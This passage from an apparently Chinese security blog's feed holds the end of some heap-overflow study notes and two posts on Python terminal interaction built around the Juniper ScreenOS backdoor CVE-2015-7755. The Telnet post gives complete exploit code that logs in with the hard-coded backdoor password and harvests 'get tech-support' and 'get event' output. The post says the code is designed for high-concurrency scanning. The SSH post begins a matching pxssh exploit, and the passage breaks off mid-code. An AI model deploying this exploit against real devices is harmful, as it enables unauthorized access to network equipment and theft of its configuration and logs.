<img src="/tech/heap-overflow-learning-notes-1/0day_5_1_3.png" alt="《0day安全：软件漏洞分析技术》(第二版) -> P148 -> 图5.1.3" title="《0day安全：软件漏洞分析技术》(第二版) -> P148 -> 图5.1.3">
<p>示例代码如下：</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P161 -> heap_lookaside.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************************</span><br><span class="line">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span><br><span class="line">		</span><br><span class="line">POC code of chapter 5 in book "Lookaside Using"</span><br><span class="line"> </span><br><span class="line">file name	: heap_lookaside.c</span><br><span class="line">author		: failwest  </span><br><span class="line">date		: 2010.09.04</span><br><span class="line">description	: demo show of how heap works</span><br><span class="line">Noticed		:	1 only run on windows 2000</span><br><span class="line">				2 complied with VC 6.0</span><br><span class="line">				3 build into release version</span><br><span class="line">				4 only used for run time debugging</span><br><span class="line">version		: 1.0</span><br><span class="line">E-mail		: failwest@gmail.com</span><br><span class="line">		</span><br><span class="line">	Only for educational purposes    enjoy the fun from exploiting :)</span><br><span class="line">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>本例中创建堆与上例中创建堆时的不同之处在于HeapCreate函数的使用，该函数细节详见<a href="https://msdn.microsoft.com/zh-cn/library/aa366599" target="_blank" rel="external">MSDN</a>，该函数的第3个参数dwMaximumSize指定了该堆所能占用的最大空间，若dwMaximumSize=0，则将会创建一个按所需空间大小动态自增长的堆。</p>
<p>0day书中没有指出是否在调用HeapCreate时，将dwMaximumSize设置为0时系统就会自动启用快表，而置为非零时系统默认不使用快表，根据我的理解应该是这样的。</p>
<p><strong>在实验调试中，我发现0day书中5.2.7 “快表的使用”一节中有较为明显的错误，而后连锁反应式地在本节中引发了一连串错误。一开始还不敢确定，后来经过反复调试并阅读，基本确定错误属实而非环境不同造成的结果差异，下文将详述之。</strong></p>
<h4 id="1-观察堆表信息"><a href="#1-观察堆表信息" class="headerlink" title="(1) 观察堆表信息"></a>(1) 观察堆表信息</h4><p>0x178处存储的尾块指针不再指向0x688，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_1.png" alt="图1.2.1" title="图1.2.1">
<blockquote>
<p>这里插播一个在学习过程中发现的OllyDBG使用小Tips，之前没看过OllyDBG的使用文档，一些最基本的操作都是从0day书中学习到的，因此已经熟悉OllyDBG使用的同学可忽略这条Tips。</p>
<p>观察上图中0x178处指针指向的尾块地址0x00361E90，若我们想要跳转到该地址去查看尾块，可以按照0day书中的方法在上图的内存查看窗口中按下Ctrl+G，然后键入361E90（默认16进制），就能够转到该地址查看内存。</p>
<p>此外，还可以用鼠标右键单击内存0x178处的值0x90，选择”Follow DWORD in Dump”，即可跳转到内存0x00361E90处。还可以通过单击+或-以来回切换前面的或后面的内存窗口查看，以实现0x178和0x1E90处内存的快速来回切换查看。</p>
</blockquote>
<p>0x688处已经被快表所霸占，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_2.png" alt="图1.2.2" title="图1.2.2">
<blockquote>
<p>与上图对应的0day书中图5.2.17标注的Lookaside[0]位于0x6b8处而非0x688处，书中的标注有误。</p>
</blockquote>
<h4 id="2-观察堆块的分配"><a href="#2-观察堆块的分配" class="headerlink" title="(2) 观察堆块的分配"></a>(2) 观察堆块的分配</h4><p>接着，我们来观察堆块分配操作，观察h1申请后的内存，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_3.png" alt="图1.2.3" title="图1.2.3">
<p>此时0x178处的尾块指针指向0x1EA0，说明跟上节中讨论的空表内存申请一样，申请过程也是Freelist[0]所指向的尾块为h1腾出了空间，结果表现为尾块缩小 2 x 8 Byte，它的起始部分“向后移动”了。</p>
<p>接着执行代码，完成h1至h4的分配，观察此时内存数据，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_4.png" alt="图1.2.4" title="图1.2.4">
<h4 id="3-观察堆块的释放"><a href="#3-观察堆块的释放" class="headerlink" title="(3) 观察堆块的释放"></a>(3) 观察堆块的释放</h4><p>再观察h1至h4释放后的内存数据，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_5.png" alt="图1.2.5" title="图1.2.5">
<p>可以看到，与空表中不同的是，在释放后各块块首中从左至右第6 Byte的数据并未改变，仍为0x01即Busy状态，该标识可以保证即使该堆块现在已变为空闲堆块也不会被系统自动合并。</p>
<p>其中，被释放后的h2中多出了一个指针，关于其用途，待观察0x688处的快表即可明白，如下图：</p>
<img src="/tech/heap-overflow-learning-notes-1/1_2_6.png" alt="图1.2.6" title="图1.2.6">
<p>从上图可以看出，被释放后的各块被链入快表中，形成了3条单向链表：</p>
<ul>
<li>Lookaside[2] -&gt; h2 -&gt; h1</li>
<li>Lookaside[3] -&gt; h3</li>
<li>Lookaside[4] -&gt; h4</li>
</ul>
<blockquote>
<p>0day书中图5.2.20标注的Lookaside[1], Lookaside[2], Lookaside[3]分别位于0x6E8 0x718 0x748，书中的标注有误。</p>
</blockquote>
<p>运行之后的代码，C代码中的新h2需要16 Byte空间，加上块首，需占 (2+1) x 8 Byte空间，因此在分配时已被链入Lookaside[3]的之前h3的内存0x1EB0将被新h2所使用，0x718处的指针在分配完毕后将被置0，在新h2被释放后该处指针又会恢复，整个过程较为简单，不再赘述。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（一）: Telnet篇]]></title>
      <url>http://dog.wtf/tech/shell-interaction-in-python-1-telnet/</url>
      <content type="html"><![CDATA[<ul>
<li>Title(EN): <em><strong>Shell Interaction in Python #1: Telent</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>我们常常需要使用编程语言实现与某些终端交互，以实现交互过程的可控性。具体到这类涉及终端交互的漏洞，只有编写合适的PoC/Exp，并与目标有正确的交互逻辑，才能进行漏洞验证。</p>
<p>这里，我们以Juniper后门漏洞CVE-2015-7755为例，介绍如何使用Python编写Telnet交互程序，且:</p>
<ul>
<li>要求该程序是可以用于高并发扫描的。</li>
<li>实现Exp，获取相关敏感信息。</li>
</ul>
<p>Juniper后门漏洞相关信息可参见<a href="http://www.freebuf.com/news/90323.html" target="_blank" rel="external">Freebuf相关文章</a>。简而言之，即可使用任意用户名及密码 <strong><em>&lt;&lt;&lt; %s(un=’%s’) = %u</em></strong> 来登录一些Juniper ScreenOS设备的Telnet及SSh服务。</p>
<h3 id="0x01-难点"><a href="#0x01-难点" class="headerlink" title="0x01 难点"></a>0x01 难点</h3><h4 id="模块选择"><a href="#模块选择" class="headerlink" title="模块选择"></a>模块选择</h4><p>初版PoC程序我使用了相对底层的socket模块来简单实现，用于检测单个目标没有问题，但在高并发扫描的时候效率极低，猜测是I/O阻塞的原因。</p>
<p>转而使用系统库内置模块telnetlib：</p>
<ul>
<li><a href="https://docs.python.org/2/library/telnetlib.html" target="_blank" rel="external">文档</a></li>
<li><a href="https://github.com/python/cpython/blob/2.7/Lib/telnetlib.py" target="_blank" rel="external">源码</a></li>
</ul>
<p>使用telnet模块后并发扫描的效率就非常高了，CPU及带宽占用率都上去了。简单翻阅telnetlib的源码，发现它是有I/O控制的。</p>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p>Juniper设备使用get命令来获取设备的各类信息，可以使用 <em><strong>get ?</strong></em> 来查看相关命令，其中最重要的是2个：</p>
<ul>
<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
</ul>
<p>但存在一个问题，如上2个命令返回的全部信息总量通常比较大，一般&gt;=40KB，而服务端不是一次性将信息全部输出给客户端的，而是分批输出到管道中的，客户端需要不断地键入回车，来顺序获取各个信息分段。</p>
<p>这就要求程序能不断获取结果信息，并正确判断最后一个分段以适时终止。</p>
<a id="more"></a>
<h3 id="0x02-代码"><a href="#0x02-代码" class="headerlink" title="0x02 代码"></a>0x02 代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib <span class="keyword">as</span> tl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">23</span>, timeout=<span class="number">10</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line">        data = <span class="string">'--- more ---'</span></span><br><span class="line">        ret = <span class="string">''</span></span><br><span class="line">        flag = <span class="string">'-&gt;'</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">'-&gt;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag = telnetConn.read_until(<span class="string">'-&gt;'</span>, timeout=timeout)</span><br><span class="line">        toNum = <span class="number">0</span>  <span class="comment"># the max timeout times</span></span><br><span class="line">        telnetConn.write(cmd)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'- more -'</span> <span class="keyword">in</span> data) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            telnetConn.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = telnetConn.read_until(<span class="string">'- more -'</span>, timeout=timeout)</span><br><span class="line">                ret += data</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    telnetConn = tl.Telnet(host=host, port=port, timeout=timeout)</span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'login: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'login'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>, ret, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    telnetConn.write(<span class="string">'root'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'password: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    telnetConn.write(<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span> + <span class="string">'\n'</span>)</span><br><span class="line">    banner = telnetConn.read_some()</span><br><span class="line">    telnetConn.write(<span class="string">'?'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    help = telnetConn.read_until(banner, timeout=timeout)</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure>
<p>代码说明：</p>
<ul>
<li>5 - 21行：实现了exp函数，用于在执行某个命令cmd，并获取全部的返回信息。其中， <strong>-&gt;</strong> 字符串是juniper的shell输入提示符，我们通过判断它来过滤掉上一次的多余输出。在连续获取结果分段的过程中，若出现超时，则会最多尝试maxTo次。</li>
<li>23 - 42行：主代码逻辑，登陆了远端telnet，并执行了?命令，判断返回的信息中是否包含success<em>flag变量对应的字符串，默认是’ping other host’，若存在则断定存在该漏洞。若doExp为True，则表示执行Exp，则程序会调用exp()函数分别执行上节中提到2个get命令并获取全部返回信息。 </em><strong>这里需要特别指出的是，返回的techsupport字符串中可能含有各种特殊编码的字符串，因此若需对其进行转码操作请再三考虑，以防改变原始数据</strong>_。</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇]]></title>
      <url>http://dog.wtf/tech/shell-interaction-in-python-2-ssh/</url>
      <content type="html"><![CDATA[<ul>
<li>Title(EN): <em><strong>Shell Interaction in Python #2: SSH</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<h3 id="0x00-难点"><a href="#0x00-难点" class="headerlink" title="0x00 难点"></a>0x00 难点</h3><h4 id="1-模块选择"><a href="#1-模块选择" class="headerlink" title="1. 模块选择"></a>1. 模块选择</h4><p>对于SSH交互而言，很难以纯socket去实现，因为SSH的认证过程中涉及到各种算法，工作量太大，因此考虑使用已有的SSH模块实现。</p>
<h5 id="1-paramiko"><a href="#1-paramiko" class="headerlink" title="(1) paramiko"></a>(1) paramiko</h5><p>SSH交互最常用的是第三方模块是paramiko：</p>
<ul>
<li><a href="http://docs.paramiko.org/" target="_blank" rel="external">文档</a></li>
<li><a href="https://github.com/paramiko/paramiko/tree/master/paramiko" target="_blank" rel="external">源码</a></li>
</ul>
<a id="more"></a>
<p>下面给出使用paramiko进行ssh登录的一个demo:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sshLogin</span><span class="params">(host, username, password, port=<span class="number">22</span>, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(</span><br><span class="line">            host,</span><br><span class="line">            username=username,</span><br><span class="line">            password=password,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            compress=<span class="keyword">True</span>,</span><br><span class="line">            allow_agent=<span class="keyword">False</span>,</span><br><span class="line">            look_for_keys=<span class="keyword">False</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.authenticated</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.get_banner()</span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">'ls'</span>, bufsize=<span class="number">1024</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stdout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'... '</span> + line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure>
<p>代码说明：</p>
<ul>
<li>17行：用于判断是否登录成功</li>
<li>18行：用于输出ssh banner，即登录成功后的欢迎字符串，比如我的vps登录成功后有如下欢迎字符串:</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Welcome</span> to Ubuntu <span class="number">14</span>.<span class="number">04</span>.<span class="number">3</span> LTS (GNU/Linux <span class="number">3</span>.<span class="number">13</span>.<span class="number">0</span>-<span class="number">68</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line">Last login: Wed Dec <span class="number">30</span> <span class="number">01</span>:<span class="number">55</span>:<span class="number">57</span> <span class="number">2015</span> from <span class="number">222.222.222.222</span></span><br><span class="line">root<span class="variable">@vultr</span>:~<span class="comment"># c</span></span><br></pre></td></tr></table></figure>
<p>使用如上demo函数尝试登录我的vps，成功登录并打印了ls命令的输出。</p>
<p>但是存在如下问题：</p>
<ul>
<li>使用如上sshLogin函数登录juniper设备，代码运行到17行时输出为True，说明成功登录了，但当执行到第19行时，会出现如下错误：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/client.py"</span>, line 405, <span class="keyword">in</span> <span class="built_in">exec</span>_<span class="built_in">command</span></span><br><span class="line">    chan.exec_<span class="built_in">command</span>(<span class="built_in">command</span>)</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, line 60, <span class="keyword">in</span> _check</span><br><span class="line">    <span class="built_in">return</span> func(self, *args, **kwds)</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, line 229, <span class="keyword">in</span> <span class="built_in">exec</span>_<span class="built_in">command</span></span><br><span class="line">    self._<span class="built_in">wait</span>_<span class="keyword">for</span>_event()</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, line 1086, <span class="keyword">in</span> _<span class="built_in">wait</span>_<span class="keyword">for</span>_event</span><br><span class="line">    raise e</span><br><span class="line">paramiko.ssh_exception.SSHException: Channel closed.</span><br></pre></td></tr></table></figure>
<p>这会导致SSH连接的中断，导致这种异常的原因，可能是juniper这种设备的SSH实现是非标准的，而paramiko对这些非标准SSH支持不佳所致，而使用Unix/Linux自带的SSH客户端程序登陆这些设备就没有这种问题。看来paramiko并不是完美的解决方案，如果仅仅需要验证是否登陆成功，它还是可以满足的。</p>
<ul>
<li>无论目标是我的vps还是juniper设备，第18行输出的都是空字符串。在google上百度了一下，有人遇到类似问题（<a href="https://github.com/paramiko/paramiko/issues/273" target="_blank" rel="external">#1</a> <a href="https://github.com/paramiko/paramiko/pull/58" target="_blank" rel="external">#2</a> <a href="http://stackoverflow.com/questions/25609153/paramiko-error-reading-ssh-protocol-banner" target="_blank" rel="external">#3</a>），也有人做了解答，但大都还是说调用get_banner()函数，并不是解决办法。猜测这可能是paramiko自身的问题，没有深究，如果您知道原因及解决办法，还请指教。</li>
</ul>
<h5 id="2-pexpect"><a href="#2-pexpect" class="headerlink" title="(2) pexpect"></a>(2) pexpect</h5><p>从Freebuf文章 <a href="http://www.freebuf.com/vuls/90886.html" target="_blank" rel="external">“利用Censys批量获取Juniper Netscreen后门”</a> 中了解到pexpect可以用来实现SSH交互，于是简单了解一番。</p>
<ul>
<li><a href="http://pexpect.readthedocs.org/" target="_blank" rel="external">文档</a></li>
<li><a href="https://github.com/pexpect/pexpect/tree/master/pexpect" target="_blank" rel="external">源码</a></li>
<li>相关资料:<ul>
<li><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-pexpect1/" target="_blank" rel="external">探索 Pexpect，第 1 部分：剖析 Pexpect</a></li>
<li><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-pexpect2/" target="_blank" rel="external">探索 Pexpect，第 2 部分：Pexpect 的实例分析</a></li>
</ul>
</li>
</ul>
<p>Freebuf的文章中提到了编写PoC验证设备是否还存在漏洞的思路：</p>
<blockquote>
<p>其实由于登录后并不是传统的SSH，而是该防火墙的操作终端，因此pxssh会认为并没有登录成功，而是返回超时异常，此时我们检测其返回的before字段如果有Remote Management Console字样就说明该主机存在后门。</p>
</blockquote>
<p>其中提到的pxssh是pexpect中的一个类pexpect.pxssh.pxssh，编写SSH交互程序需要用到它，使用示例参见<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-pexpect2/" target="_blank" rel="external">IBM的文档</a>。</p>
<p>尝试了一番，pxssh其实是可以登陆成功的，并没有文章中所说的 “返回异常”。</p>
<p>其实pxssh底层实现还是以进程的方式调用Unix/Linux自带的SSH可执行程序的，而正如上面提到的自带的SSH兼容性很强，因此使用pxssh编写PoC是不错的选择。</p>
<p>但若将程序用于高并发扫描，需要权衡一下并发数与机器性能，因为每扫描一个目标就需要运行一个SSH客户端程序进程。</p>
<h4 id="2-Exp"><a href="#2-Exp" class="headerlink" title="2. Exp"></a>2. Exp</h4><p>PoC可以编写了，接下来是Exp，目标还是执行如下2个命令：</p>
<ul>
<li><em><strong>get tech-support</strong></em> : 它综合了大部分get子命令的结果。</li>
<li><em><strong>get event</strong></em> : 包含了设备日志。</li>
</ul>
<p>SSH Exp的逻辑与Telnet几乎一样，但是 pexpect.pxssh.pxssh 类中并没有类似于 telnetlib.Telnet 类中的 read_until(expected[, timeout]) 这种函数。</p>
<p>我们可以使用实例函数 pxssh.sendline(cmd) 来发送命令，其中cmd为命令字符串，结尾不必包含\n，函数会在命令结尾自动添加。</p>
<p>但使用pxssh编写Exp，还是存在如下问题：</p>
<ul>
<li>pxssh默认将上一次命令执行后返回的结果字符串存储在实例变量pxssh.before中，但是在多次获取结果分段时，连续2次获取的消息分段会有重叠。</li>
<li>从源码可以看到pxssh类继承自pexpect.pyt_spawn.spawn类，而spawn类又继承自pexpect.spawnbase.SpawnBase类。在SpawnBase类中，存在类变量buffer，用于接收服务器端发回的消息。因此尝试直接使用pxssh.buffer变量来代替before变量，并在每一次发送新的命令之前，将pxssh.buffer清空，但是又出现了结果不完整的问题。</li>
<li>可以尝试使用<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-pexpect2/" target="_blank" rel="external">IBM的文章</a>中 “例 3：ssh 的使用” 提到的，直接使用spawn类来实现，但是该类较为底层，需要我们自己处理SSH的登录及交互逻辑，且其中expect函数的pattern参数需为pexpect.expect中定义的类实例，而不是直接传入字符串或正则表达式，使用起来较为繁琐。</li>
</ul>
<p>最终找到了合适的类函数 pexpect.pty_spawn.read_nonblocking(size=1, timeout=-1) ，它读取服务器端发来的数据，直到数据字节数达到size，或者达到超时时间timeout。但终止字符串就还需由我们自己判断。</p>
<h3 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">22</span>, loginTimeout=<span class="number">10</span>,</span><br><span class="line">        readTimeout=<span class="number">2</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">readUntilTimeout</span><span class="params">()</span>:</span></span><br><span class="line">            errFlag = <span class="keyword">False</span></span><br><span class="line">            data = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> errFlag:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data += ssh.read_nonblocking(</span><br><span class="line">                        size=<span class="number">65536</span>,</span><br><span class="line">                        timeout=readTimeout</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">except</span> pexpect.exceptions.ExceptionPexpect <span class="keyword">as</span> err:</span><br><span class="line">                    errFlag = <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        readUntilTimeout()  <span class="comment"># skip verbose strings</span></span><br><span class="line">        toNum = <span class="number">0</span></span><br><span class="line">        ssh.send(cmd + <span class="string">'\n'</span>*<span 